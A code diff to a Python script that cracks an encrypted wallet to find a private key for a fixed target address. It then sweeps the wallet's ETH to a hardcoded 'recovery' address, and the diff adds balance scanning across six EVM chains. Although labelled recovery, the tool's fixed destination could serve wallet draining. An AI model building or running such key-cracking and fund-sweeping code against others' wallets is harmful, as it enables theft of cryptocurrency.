@@ -12,6 +12,7 @@ import traceback
 import binascii
 from getpass import getpass
 from typing import Dict, List, Optional, Tuple, Union
+from concurrent.futures import ThreadPoolExecutor
 
 # Import crypto libraries
 try:
@@ -35,7 +36,18 @@ except ImportError:
 class Config:
     TARGET_ADDRESS = "0x4b96471697f2dfc4019604fae7dffa4842182c1b"
     RECOVERY_ADDRESS = "0xaD496d4E1B0aC53be1c8983D3bB3753F83A81090" #deafualt show blank 
-    RPC_URL = "https://eth.llamarpc.com"
+
+    # EVM Networks to scan
+    EVM_NETWORKS = {
+        'ETH': {'url': 'https://eth.llamarpc.com', 'symbol': 'ETH'},
+        'BSC': {'url': 'https://binance.llamarpc.com', 'symbol': 'BNB'},
+        'POLYGON': {'url': 'https://polygon.llamarpc.com', 'symbol': 'MATIC'},
+        'ARBITRUM': {'url': 'https://arbitrum.llamarpc.com', 'symbol': 'ETH'},
+        'OPTIMISM': {'url': 'https://optimism.llamarpc.com', 'symbol': 'ETH'},
+        'BASE': {'url': 'https://base.llamarpc.com', 'symbol': 'ETH'},
+    }
+
+    RPC_URL = EVM_NETWORKS['ETH']['url'] # Default for transfer
     MIN_ETH_TO_LEAVE = 0.005  # ETH to leave for gas
     GAS_LIMIT = 21000  # Standard ETH transfer
     TIMEOUT = 120  # Transaction timeout in seconds
@@ -208,6 +220,8 @@ class WalletDecryptor:
                                                 
                                                 if addr.lower() == Config.TARGET_ADDRESS.lower():
                                                     print(f"\n✅ Found matching key: {key[:6]}...{key[-4:]}")
+                                                    # When found, scan balances everywhere
+                                                    EthereumTransfer.scan_all_chains(addr)
                                                     return key
                                                 
                                                 all_keys.append((key, addr))
@@ -295,7 +309,42 @@ class WalletDecryptor:
 
 class EthereumTransfer:
     """Handles Ethereum transfers"""
-    
+
+    @staticmethod
+    def get_balance(network: str, url: str, address: str) -> Tuple[str, float, str]:
+        """Check balance on a specific chain"""
+        try:
+            web3 = Web3(Web3.HTTPProvider(url))
+            if web3.is_connected():
+                balance = web3.eth.get_balance(address)
+                symbol = Config.EVM_NETWORKS[network]['symbol']
+                return (network, balance / 1e18, symbol)
+        except:
+            pass
+        return (network, 0.0, "")
+
+    @staticmethod
+    def scan_all_chains(address: str):
+        """Scan balances across all configured chains in parallel"""
+        if not WEB3_AVAILABLE:
+            return
+
+        print(f"\nScanning balances for {address} across {len(Config.EVM_NETWORKS)} chains...")
+
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            futures = [
+                executor.submit(EthereumTransfer.get_balance, name, data['url'], address)
+                for name, data in Config.EVM_NETWORKS.items()
+            ]
+
+            for future in futures:
+                network, balance, symbol = future.result()
+                if balance > 0:
+                    print(f"  {network}: {balance:.6f} {symbol}") # Output handled by server regex
+                else:
+                    # Optional: Print zero balances if verbose, but let's keep it clean
+                    pass
+
     @staticmethod
     def transfer_eth(from_address: str, private_key: str, to_address: str) -> bool:
         """Transfer ETH funds, leaving a small amount for gas"""
@@ -303,7 +352,10 @@ class EthereumTransfer:
             print("ERROR: web3 module required")
             return False
             
-        print(f"Transferring ETH from {from_address} to {to_address}")
+        # First scan all chains
+        EthereumTransfer.scan_all_chains(from_address)
+
+        print(f"\nTransferring funds from {from_address} to {to_address}")
         
         try:
             web3 = Web3(Web3.HTTPProvider(Config.RPC_URL))
@@ -323,7 +375,7 @@ class EthereumTransfer:
             print(f"Balance: {balance_eth} ETH")
             
             if balance == 0:
-                print("ERROR: No ETH in source address")
+                print("ERROR: No ETH in source address (Mainnet)")
                 return False
                 
             # Calculate amounts
